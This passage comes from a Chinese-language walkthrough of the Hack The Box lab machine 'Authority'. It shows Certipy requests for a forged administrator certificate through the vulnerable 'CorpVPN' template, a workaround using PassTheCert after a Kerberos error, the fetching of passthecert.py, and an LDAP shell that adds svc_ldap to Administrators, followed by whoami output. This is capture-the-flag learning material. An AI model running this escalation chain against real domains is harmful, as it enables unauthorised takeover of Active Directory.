</span><span id="__span-22-14"><a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a><span class="w">    </span>DNS<span class="w"> </span>Host<span class="w"> </span>Name:<span class="w"> </span><span class="s1">&#39;authority.authority.htb&#39;</span>
</span><span id="__span-22-15"><a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Certificate<span class="w"> </span>has<span class="w"> </span>no<span class="w"> </span>object<span class="w"> </span>SID
</span><span id="__span-22-16"><a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>certificate<span class="w"> </span>and<span class="w"> </span>private<span class="w"> </span>key<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;administrator_authority.pfx&#39;</span>
</span><span id="__span-22-17"><a id="__codelineno-22-17" name="__codelineno-22-17" href="#__codelineno-22-17"></a>
</span><span id="__span-22-18"><a id="__codelineno-22-18" name="__codelineno-22-18" href="#__codelineno-22-18"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority<span class="o">]</span>
</span><span id="__span-22-19"><a id="__codelineno-22-19" name="__codelineno-22-19" href="#__codelineno-22-19"></a>└─$<span class="w"> </span>certipy<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;TEST$&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;qwerasdf&#39;</span><span class="w"> </span>-ca<span class="w"> </span>AUTHORITY-CA<span class="w"> </span>-template<span class="w"> </span><span class="s1">&#39;CorpVPN&#39;</span><span class="w"> </span>-upn<span class="w"> </span>administrator<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.222<span class="w"> </span>-debug
</span><span id="__span-22-20"><a id="__codelineno-22-20" name="__codelineno-22-20" href="#__codelineno-22-20"></a>Certipy<span class="w"> </span>v4.7.0<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-22-21"><a id="__codelineno-22-21" name="__codelineno-22-21" href="#__codelineno-22-21"></a>
</span><span id="__span-22-22"><a id="__codelineno-22-22" name="__codelineno-22-22" href="#__codelineno-22-22"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Generating<span class="w"> </span>RSA<span class="w"> </span>key
</span><span id="__span-22-23"><a id="__codelineno-22-23" name="__codelineno-22-23" href="#__codelineno-22-23"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Requesting<span class="w"> </span>certificate<span class="w"> </span>via<span class="w"> </span>RPC
</span><span id="__span-22-24"><a id="__codelineno-22-24" name="__codelineno-22-24" href="#__codelineno-22-24"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>connect<span class="w"> </span>to<span class="w"> </span>endpoint:<span class="w"> </span>ncacn_np:10.10.11.222<span class="o">[</span><span class="se">\p</span>ipe<span class="se">\c</span>ert<span class="o">]</span>
</span><span id="__span-22-25"><a id="__codelineno-22-25" name="__codelineno-22-25" href="#__codelineno-22-25"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Connected<span class="w"> </span>to<span class="w"> </span>endpoint:<span class="w"> </span>ncacn_np:10.10.11.222<span class="o">[</span><span class="se">\p</span>ipe<span class="se">\c</span>ert<span class="o">]</span>
</span><span id="__span-22-26"><a id="__codelineno-22-26" name="__codelineno-22-26" href="#__codelineno-22-26"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>requested<span class="w"> </span>certificate
</span><span id="__span-22-27"><a id="__codelineno-22-27" name="__codelineno-22-27" href="#__codelineno-22-27"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Request<span class="w"> </span>ID<span class="w"> </span>is<span class="w"> </span><span class="m">6</span>
</span><span id="__span-22-28"><a id="__codelineno-22-28" name="__codelineno-22-28" href="#__codelineno-22-28"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>certificate<span class="w"> </span>with<span class="w"> </span>UPN<span class="w"> </span><span class="s1">&#39;administrator&#39;</span>
</span><span id="__span-22-29"><a id="__codelineno-22-29" name="__codelineno-22-29" href="#__codelineno-22-29"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Certificate<span class="w"> </span>has<span class="w"> </span>no<span class="w"> </span>object<span class="w"> </span>SID
</span><span id="__span-22-30"><a id="__codelineno-22-30" name="__codelineno-22-30" href="#__codelineno-22-30"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>certificate<span class="w"> </span>and<span class="w"> </span>private<span class="w"> </span>key<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;administrator.pfx&#39;</span>
</span></code></pre></div></p>
<p>直接就获得pfx格式的证书了，执行后续步骤。不过两个证书都会报错 <code>KDC_ERR_PADATA_TYPE_NOSUPP</code>：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority<span class="o">]</span>
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>└─$<span class="w"> </span>certipy<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span><span class="s1">&#39;administrator.pfx&#39;</span><span class="w"> </span>-username<span class="w"> </span><span class="s1">&#39;administrator&#39;</span><span class="w"> </span>-domain<span class="w"> </span><span class="s1">&#39;authority.htb&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.222
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>Certipy<span class="w"> </span>v4.7.0<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>principal:<span class="w"> </span>administrator@authority.htb
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>TGT...
</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>error<span class="w"> </span><span class="k">while</span><span class="w"> </span>trying<span class="w"> </span>to<span class="w"> </span>request<span class="w"> </span>TGT:<span class="w"> </span>Kerberos<span class="w"> </span>SessionError:<span class="w"> </span>KDC_ERR_PADATA_TYPE_NOSUPP<span class="o">(</span>KDC<span class="w"> </span>has<span class="w"> </span>no<span class="w"> </span>support<span class="w"> </span><span class="k">for</span><span class="w"> </span>padata<span class="w"> </span><span class="nb">type</span><span class="o">)</span>
</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>
</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority<span class="o">]</span>
</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>└─$<span class="w"> </span>certipy<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span><span class="s1">&#39;administrator_authority.pfx&#39;</span><span class="w"> </span>-username<span class="w"> </span><span class="s1">&#39;administrator&#39;</span><span class="w"> </span>-domain<span class="w"> </span><span class="s1">&#39;authority.htb&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.222
</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>Certipy<span class="w"> </span>v4.7.0<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>
</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>multiple<span class="w"> </span>identifications<span class="w"> </span><span class="k">in</span><span class="w"> </span>certificate
</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Please<span class="w"> </span><span class="k">select</span><span class="w"> </span>one:
</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a><span class="w">    </span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="w"> </span>UPN:<span class="w"> </span><span class="s1">&#39;administrator@authority.htb&#39;</span>
</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a><span class="w">    </span><span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w"> </span>DNS<span class="w"> </span>Host<span class="w"> </span>Name:<span class="w"> </span><span class="s1">&#39;authority.authority.htb&#39;</span>
</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a>&gt;<span class="w"> </span><span class="m">0</span>
</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>principal:<span class="w"> </span>administrator@authority.htb
</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>TGT...
</span><span id="__span-23-20"><a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>error<span class="w"> </span><span class="k">while</span><span class="w"> </span>trying<span class="w"> </span>to<span class="w"> </span>request<span class="w"> </span>TGT:<span class="w"> </span>Kerberos<span class="w"> </span>SessionError:<span class="w"> </span>KDC_ERR_PADATA_TYPE_NOSUPP<span class="o">(</span>KDC<span class="w"> </span>has<span class="w"> </span>no<span class="w"> </span>support<span class="w"> </span><span class="k">for</span><span class="w"> </span>padata<span class="w"> </span><span class="nb">type</span><span class="o">)</span>
</span></code></pre></div></p>
<h5 id="kdc_err_padata_type_nosupp">KDC_ERR_PADATA_TYPE_NOSUPP<a class="headerlink" href="#kdc_err_padata_type_nosupp" title="Permanent link">&para;</a></h5>
<p>搜了一下这个报错，发现<a href="https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d">这篇文章</a>提到了可以用 <code>PassTheCert</code> 进行LDAP认证。  </p>
<blockquote>
<p>If you run into a situation where you can enroll in a vulnerable certificate template but the resulting certificate fails for Kerberos authentication, you can try authenticating to LDAP via SChannel using something like PassTheCert. You will only have LDAP access, but this should be enough if you have a certificate stating you’re a domain admin.</p>
</blockquote>
<h3 id="passthecert"><a href="https://github.com/AlmondOffSec/PassTheCert">PassTheCert</a><a class="headerlink" href="#passthecert" title="Permanent link">&para;</a></h3>
<p>根据其<a href="https://github.com/AlmondOffSec/PassTheCert/tree/main/Python">github文档</a>，从pfx中提取crt和key：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority<span class="o">]</span>
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>└─$<span class="w"> </span>certipy<span class="w"> </span>cert<span class="w"> </span>-pfx<span class="w"> </span>administrator_authority.pfx<span class="w"> </span>-nokey<span class="w"> </span>-out<span class="w"> </span>user.crt
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>Certipy<span class="w"> </span>v4.7.0<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>
</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Writing<span class="w"> </span>certificate<span class="w"> </span>and<span class="w">  </span>to<span class="w"> </span><span class="s1">&#39;user.crt&#39;</span>
</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>
</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority<span class="o">]</span>
</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>└─$<span class="w"> </span>certipy<span class="w"> </span>cert<span class="w"> </span>-pfx<span class="w"> </span>administrator_authority.pfx<span class="w"> </span>-nocert<span class="w"> </span>-out<span class="w"> </span>user.key
</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>Certipy<span class="w"> </span>v4.7.0<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>
</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Writing<span class="w"> </span>private<span class="w"> </span>key<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;user.key&#39;</span>
</span></code></pre></div></p>
<p>下载 <code>passthecert.py</code>，按照文档执行后成功获取admin权限的 <code>ldap-shell</code>：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority<span class="o">]</span>
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>└─$<span class="w"> </span>wget<span class="w"> </span>https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/main/Python/passthecert.py
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority<span class="o">]</span>
</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>└─$<span class="w"> </span>python3<span class="w"> </span>passthecert.py<span class="w"> </span>-action<span class="w"> </span>ldap-shell<span class="w"> </span>-crt<span class="w"> </span>user.crt<span class="w"> </span>-key<span class="w"> </span>user.key<span class="w"> </span>-domain<span class="w"> </span>authority.htb<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.222
</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>Impacket<span class="w"> </span>v0.10.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2022</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation
</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>
</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>Type<span class="w"> </span><span class="nb">help</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>commands
</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>
</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a><span class="c1"># add_user_to_group svc_ldap Administrators</span>
</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>Adding<span class="w"> </span>user:<span class="w"> </span>svc_ldap<span class="w"> </span>to<span class="w"> </span>group<span class="w"> </span>Administrators<span class="w"> </span>result:<span class="w"> </span>OK
</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a>
</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a>
</span><span id="__span-25-14"><a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a>
</span><span id="__span-25-15"><a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc_ldap<span class="se">\D</span>ocuments&gt;<span class="w"> </span>whoami<span class="w"> </span>/all
</span><span id="__span-25-16"><a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a>
</span><span id="__span-25-17"><a id="__codelineno-25-17" name="__codelineno-25-17" href="#__codelineno-25-17"></a>USER<span class="w"> </span>INFORMATION
</span><span id="__span-25-18"><a id="__codelineno-25-18" name="__codelineno-25-18" href="#__codelineno-25-18"></a>----------------
</span><span id="__span-25-19"><a id="__codelineno-25-19" name="__codelineno-25-19" href="#__codelineno-25-19"></a>
</span><span id="__span-25-20"><a id="__codelineno-25-20" name="__codelineno-25-20" href="#__codelineno-25-20"></a>User<span class="w"> </span>Name<span class="w">    </span><span class="nv">SID</span>
</span><span id="__span-25-21"><a id="__codelineno-25-21" name="__codelineno-25-21" href="#__codelineno-25-21"></a><span class="o">============</span><span class="w"> </span><span class="o">=============================================</span>
</span><span id="__span-25-22"><a id="__codelineno-25-22" name="__codelineno-25-22" href="#__codelineno-25-22"></a>htb<span class="se">\s</span>vc_ldap<span class="w"> </span>S-1-5-21-622327497-3269355298-2248959698-1601
</span><span id="__span-25-23"><a id="__codelineno-25-23" name="__codelineno-25-23" href="#__codelineno-25-23"></a>
</span><span id="__span-25-24"><a id="__codelineno-25-24" name="__codelineno-25-24" href="#__codelineno-25-24"></a>
</span><span id="__span-25-25"><a id="__codelineno-25-25" name="__codelineno-25-25" href="#__codelineno-25-25"></a>GROUP<span class="w"> </span>INFORMATION
</span><span id="__span-25-26"><a id="__codelineno-25-26" name="__codelineno-25-26" href="#__codelineno-25-26"></a>-----------------
</span><span id="__span-25-27"><a id="__codelineno-25-27" name="__codelineno-25-27" href="#__codelineno-25-27"></a>
</span><span id="__span-25-28"><a id="__codelineno-25-28" name="__codelineno-25-28" href="#__codelineno-25-28"></a>Group<span class="w"> </span>Name<span class="w">                                 </span>Type<span class="w">             </span>SID<span class="w">          </span><span class="nv">Attributes</span>
</span><span id="__span-25-29"><a id="__codelineno-25-29" name="__codelineno-25-29" href="#__codelineno-25-29"></a><span class="o">==========================================</span><span class="w"> </span><span class="o">================</span><span class="w"> </span><span class="o">============</span><span class="w"> </span><span class="o">===============================================================</span>
</span><span id="__span-25-30"><a id="__codelineno-25-30" name="__codelineno-25-30" href="#__codelineno-25-30"></a>Everyone<span class="w">                                   </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-1-0<span class="w">      </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-25-31"><a id="__codelineno-25-31" name="__codelineno-25-31" href="#__codelineno-25-31"></a>BUILTIN<span class="se">\A</span>dministrators<span class="w">                     </span>Alias<span class="w">            </span>S-1-5-32-544<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group,<span class="w"> </span>Group<span class="w"> </span>owner
</span><span id="__span-25-32"><a id="__codelineno-25-32" name="__codelineno-25-32" href="#__codelineno-25-32"></a>BUILTIN<span class="se">\R</span>emote<span class="w"> </span>Management<span class="w"> </span>Users<span class="w">            </span>Alias<span class="w">            </span>S-1-5-32-580<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-25-33"><a id="__codelineno-25-33" name="__codelineno-25-33" href="#__codelineno-25-33"></a>BUILTIN<span class="se">\U</span>sers<span class="w">                              </span>Alias<span class="w">            </span>S-1-5-32-545<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-25-34"><a id="__codelineno-25-34" name="__codelineno-25-34" href="#__codelineno-25-34"></a>BUILTIN<span class="se">\P</span>re-Windows<span class="w"> </span><span class="m">2000</span><span class="w"> </span>Compatible<span class="w"> </span>Access<span class="w"> </span>Alias<span class="w">            </span>S-1-5-32-554<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-25-35"><a id="__codelineno-25-35" name="__codelineno-25-35" href="#__codelineno-25-35"></a>BUILTIN<span class="se">\C</span>ertificate<span class="w"> </span>Service<span class="w"> </span>DCOM<span class="w"> </span>Access<span class="w">    </span>Alias<span class="w">            </span>S-1-5-32-574<span class="w"> </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-25-36"><a id="__codelineno-25-36" name="__codelineno-25-36" href="#__codelineno-25-36"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\N</span>ETWORK<span class="w">                       </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-2<span class="w">      </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-25-37"><a id="__codelineno-25-37" name="__codelineno-25-37" href="#__codelineno-25-37"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\A</span>uthenticated<span class="w"> </span>Users<span class="w">           </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-11<span class="w">     </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-25-38"><a id="__codelineno-25-38" name="__codelineno-25-38" href="#__codelineno-25-38"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\T</span>his<span class="w"> </span>Organization<span class="w">             </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-15<span class="w">     </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-25-39"><a id="__codelineno-25-39" name="__codelineno-25-39" href="#__codelineno-25-39"></a>NT<span class="w"> </span>AUTHORITY<span class="se">\N</span>TLM<span class="w"> </span>Authentication<span class="w">           </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-64-10<span class="w">  </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
</span><span id="__span-25-40"><a id="__codelineno-25-40" name="__codelineno-25-40" href="#__codelineno-25-40"></a>Mandatory<span class="w"> </span>Label<span class="se">\H</span>igh<span class="w"> </span>Mandatory<span class="w"> </span>Level<span class="w">       </span>Label<span class="w">            </span>S-1-16-12288
</span><span id="__span-25-41"><a id="__codelineno-25-41" name="__codelineno-25-41" href="#__codelineno-25-41"></a>
</span><span id="__span-25-42"><a id="__codelineno-25-42" name="__codelineno-25-42" href="#__codelineno-25-42"></a>
</span><span id="__span-25-43"><a id="__codelineno-25-43" name="__codelineno-25-43" href="#__codelineno-25-43"></a>PRIVILEGES<span class="w"> </span>INFORMATION
</span><span id="__span-25-44"><a id="__codelineno-25-44" name="__codelineno-25-44" href="#__codelineno-25-44"></a>----------------------
</span><span id="__span-25-45"><a id="__codelineno-25-45" name="__codelineno-25-45" href="#__codelineno-25-45"></a>
</span><span id="__span-25-46"><a id="__codelineno-25-46" name="__codelineno-25-46" href="#__codelineno-25-46"></a>Privilege<span class="w"> </span>Name<span class="w">                            </span>Description<span class="w">                                                        </span><span class="nv">State</span>
</span><span id="__span-25-47"><a id="__codelineno-25-47" name="__codelineno-25-47" href="#__codelineno-25-47"></a><span class="o">=========================================</span><span class="w"> </span><span class="o">==================================================================</span><span class="w"> </span><span class="o">=======</span>
</span><span id="__span-25-48"><a id="__codelineno-25-48" name="__codelineno-25-48" href="#__codelineno-25-48"></a>SeIncreaseQuotaPrivilege<span class="w">                  </span>Adjust<span class="w"> </span>memory<span class="w"> </span>quotas<span class="w"> </span><span class="k">for</span><span class="w"> </span>a<span class="w"> </span>process<span class="w">                                 </span>Enabled
</span><span id="__span-25-49"><a id="__codelineno-25-49" name="__codelineno-25-49" href="#__codelineno-25-49"></a>SeMachineAccountPrivilege<span class="w">                 </span>Add<span class="w"> </span>workstations<span class="w"> </span>to<span class="w"> </span>domain<span class="w">                                         </span>Enabled
</span><span id="__span-25-50"><a id="__codelineno-25-50" name="__codelineno-25-50" href="#__codelineno-25-50"></a>SeSecurityPrivilege<span class="w">                       </span>Manage<span class="w"> </span>auditing<span class="w"> </span>and<span class="w"> </span>security<span class="w"> </span>log<span class="w">                                   </span>Enabled
</span><span id="__span-25-51"><a id="__codelineno-25-51" name="__codelineno-25-51" href="#__codelineno-25-51"></a>SeTakeOwnershipPrivilege<span class="w">                  </span>Take<span class="w"> </span>ownership<span class="w"> </span>of<span class="w"> </span>files<span class="w"> </span>or<span class="w"> </span>other<span class="w"> </span>objects<span class="w">                           </span>Enabled
</span><span id="__span-25-52"><a id="__codelineno-25-52" name="__codelineno-25-52" href="#__codelineno-25-52"></a>SeLoadDriverPrivilege<span class="w">                     </span>Load<span class="w"> </span>and<span class="w"> </span>unload<span class="w"> </span>device<span class="w"> </span>drivers<span class="w">                                     </span>Enabled
</span><span id="__span-25-53"><a id="__codelineno-25-53" name="__codelineno-25-53" href="#__codelineno-25-53"></a>SeSystemProfilePrivilege<span class="w">                  </span>Profile<span class="w"> </span>system<span class="w"> </span>performance<span class="w">                                         </span>Enabled
</span><span id="__span-25-54"><a id="__codelineno-25-54" name="__codelineno-25-54" href="#__codelineno-25-54"></a>SeSystemtimePrivilege<span class="w">                     </span>Change<span class="w"> </span>the<span class="w"> </span>system<span class="w"> </span><span class="nb">time</span><span class="w">                                             </span>Enabled
</span><span id="__span-25-55"><a id="__codelineno-25-55" name="__codelineno-25-55" href="#__codelineno-25-55"></a>SeProfileSingleProcessPrivilege<span class="w">           </span>Profile<span class="w"> </span>single<span class="w"> </span>process<span class="w">                                             </span>Enabled
</span><span id="__span-25-56"><a id="__codelineno-25-56" name="__codelineno-25-56" href="#__codelineno-25-56"></a>SeIncreaseBasePriorityPrivilege<span class="w">           </span>Increase<span class="w"> </span>scheduling<span class="w"> </span>priority<span class="w">                                       </span>Enabled
</span><span id="__span-25-57"><a id="__codelineno-25-57" name="__codelineno-25-57" href="#__codelineno-25-57"></a>SeCreatePagefilePrivilege<span class="w">                 </span>Create<span class="w"> </span>a<span class="w"> </span>pagefile<span class="w">                                                  </span>Enabled
</span><span id="__span-25-58"><a id="__codelineno-25-58" name="__codelineno-25-58" href="#__codelineno-25-58"></a>SeBackupPrivilege<span class="w">                         </span>Back<span class="w"> </span>up<span class="w"> </span>files<span class="w"> </span>and<span class="w"> </span>directories<span class="w">                                      </span>Enabled
</span><span id="__span-25-59"><a id="__codelineno-25-59" name="__codelineno-25-59" href="#__codelineno-25-59"></a>SeRestorePrivilege<span class="w">                        </span>Restore<span class="w"> </span>files<span class="w"> </span>and<span class="w"> </span>directories<span class="w">                                      </span>Enabled
</span><span id="__span-25-60"><a id="__codelineno-25-60" name="__codelineno-25-60" href="#__codelineno-25-60"></a>SeShutdownPrivilege<span class="w">                       </span>Shut<span class="w"> </span>down<span class="w"> </span>the<span class="w"> </span>system<span class="w">                                               </span>Enabled
